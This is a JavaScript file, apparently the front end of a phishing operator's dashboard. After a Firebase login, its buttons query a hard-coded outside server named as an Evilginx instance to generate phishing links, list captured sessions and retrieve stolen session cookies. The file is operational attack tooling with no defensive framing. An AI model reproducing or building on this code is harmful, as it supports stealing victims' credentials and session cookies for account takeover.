console.log("✅ Script.js loaded successfully");

document.getElementById("loginBtn")?.addEventListener("click", function () {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    firebase.auth().signInWithEmailAndPassword(email, password)
        .then(() => {
            window.location.href = "dashboard.html";
        })
        .catch(error => {
            document.getElementById("loginError").innerText = error.message;
        });
});

document.getElementById("logoutBtn")?.addEventListener("click", function () {
    firebase.auth().signOut().then(() => {
        window.location.href = "index.html";
    }).catch(error => console.log("Logout Error:", error));
});

const evilginx_server = "http://3.149.242.245:5000";

document.getElementById("generateLinkBtn")?.addEventListener("click", function () {
    fetch(`${evilginx_server}/generate_link`)
        .then(response => response.json())
        .then(data => document.getElementById("output").innerText = data.link)
        .catch(error => console.error("Error:", error));
});

document.getElementById("viewSessionsBtn")?.addEventListener("click", function () {
    fetch(`${evilginx_server}/sessions`)
        .then(response => response.json())
        .then(data => document.getElementById("output").innerText = JSON.stringify(data, null, 2))
        .catch(error => console.error("Error:", error));
});

document.getElementById("viewCookiesBtn")?.addEventListener("click", function () {
    fetch(`${evilginx_server}/cookies`)
        .then(response => response.json())
        .then(data => document.getElementById("output").innerText = JSON.stringify(data, null, 2))
        .catch(error => console.error("Error:", error));
});
